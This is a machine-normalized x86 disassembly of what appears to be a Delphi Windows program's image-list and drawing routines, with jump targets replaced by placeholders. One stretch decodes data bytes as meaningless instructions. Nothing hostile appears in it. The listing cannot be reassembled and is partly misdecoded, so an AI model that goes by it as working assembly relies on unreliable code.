inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44eed8
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44f434
sub_44f53c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_44f5b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404414
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a468
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a468
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_44f61c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_44f674
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404414
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_44f6d4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_44f730
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_44f794
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_41a468
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_44f7f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404414
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420c6c
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44f3d4
sub_44f840
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44f868
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44ecf4
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44f434
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44f8fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41beb4
mov edi eax
mov eax esi
call sub_452320
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44f928
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44f96c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44f991
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f998
retn
sub_44fa17
[ eax + edx + 0x45 ]
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
nop
cli
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
cli
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
cli
inc esp
add ah bl
cli
inc esp
add [ eax ] ch
add [ eax ] al
xor al 0x8d
inc ecx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffa8453abe
sti
inc esp
add al bh
add eax 0x9800045
inc ebp
add [ eax ] bh
add eax 0xb640045
inc edx
add [ eax ] dh
or al [ edx ]
je r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
add [ ebp ] eax
adc al 0xfc
inc esp
add [ esi + ecx ] dh
inc ebp
add al al
push cs
inc ebp
add [ eax ] bh
pop es
inc ebp
add [ ecx ] al
add bh ch
dec [ eax + 0x7 ]
inc ebp
add [ eax ] dl
push esp
inc ebx
jne r-xdata
inc edx
add [ eax + 0x5c00420e ] bh
sti
inc esp
add [ ecx + eax ] ch
inc ebp
add [ esp + edi * 8 ] dl
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0xf400408d
cli
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx + 0xb9de8c6 ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x19e80f74 ] 0x3a
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xor [ esi + 0x20041 ] cl
pop es
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_44fb5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_44fba8
push ebx
push esi
push edi
call sub_4035c0
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a550
mov edx eax
mov eax edi
call sub_450798
mov eax [ edi + 0x50 ]
call sub_403234
mov eax edi
call sub_44fe6c
mov eax [ edi + 0x4c ]
call sub_403234
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
test bl bl
jle r-xdata
call sub_403234
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a8
sub_44fc14
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44fcc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_450720
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44fce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fcc8
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_44fce0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44fd81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_429dc4
mov eax ebx
call sub_4292a4
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424270
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_419034
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4292a4
pop edx
call sub_424614
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fd88
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44fda4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44fce0
pop ecx
pop edx
pop ebx
retn
sub_44fddc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fe6c
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44fda4
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403430
sub_44fe18
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4506a8
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_429310
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44fe6c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44fe08
push eax
call ImageList_Destroy
sub_44fea4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44ff37
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44fccc
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff3e
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov edx eax
mov eax ebx
call sub_4500cc
sub_44ff44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fff3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ffd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44fcd4
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fe18
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44fe18
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ffdd
mov eax [ ebp - 0x10 ]
call sub_403234
retn
sub_450010
push ebx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44fe08
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_450034
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4500b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_450010
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44fccc
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax ebx
mov si 0xffef
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500ba
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push esi
mov eax ebx
call sub_44fe08
push eax
call ImageList_Remove
sub_4500cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44fb1c
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
sub_450104
push ebx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44fe08
push eax
call ImageList_GetBkColor
call sub_44fb3c
pop ebx
retn
sub_45012c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44fb1c
push eax
mov eax ebx
call sub_450104
call sub_44fb1c
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_4249b8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44fe08
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4292a4
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424270
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_419034
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4292a4
pop edx
call sub_424614
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4292a4
call sub_4249b8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44fe08
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_419034
mov eax [ ebx + 0x54 ]
call sub_4292a4
call sub_4249b8
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_424270
mov eax edi
call sub_4249b8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_424270
mov eax edi
call sub_4249b8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42a014
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_450300
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_450324
pop ebx
pop ebp
retn 0xc
sub_450324
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_450370
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_419034
mov eax [ ebp - 0x4 ]
call sub_451004
xor eax eax
push ebp
push sub_450509
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4504ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4504cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42a014
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4504d6
mov eax [ ebp - 0x10 ]
call sub_403234
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4292a4
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_424614
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4249b8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4292a4
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_424614
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_4249b8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ff44
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_450518
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44fe08
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_450370
sub_450538
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
call sub_44fe6c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41aa64
mov eax ebx
call sub_4500c0
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_450720
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44fe08
mov edx eax
mov eax ebx
call sub_44fda4
mov eax ebx
call sub_44fccc
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44fe08
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44fcd4
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44fe08
push eax
call ImageList_GetBkColor
call sub_44fb3c
mov edx eax
mov eax ebx
call sub_4500cc
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_450518
jmp r-xdata
sub_4505f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41ab48
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_450720
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_4500c0
mov eax esi
call sub_44fe08
mov edx eax
mov eax ebx
call sub_44fda4
mov eax ebx
call sub_44fccc
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44fe08
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44fcd4
jmp r-xdata
mov eax esi
call sub_44fe08
push eax
call ImageList_GetBkColor
call sub_44fb3c
mov edx eax
mov eax ebx
call sub_4500cc
mov edx esi
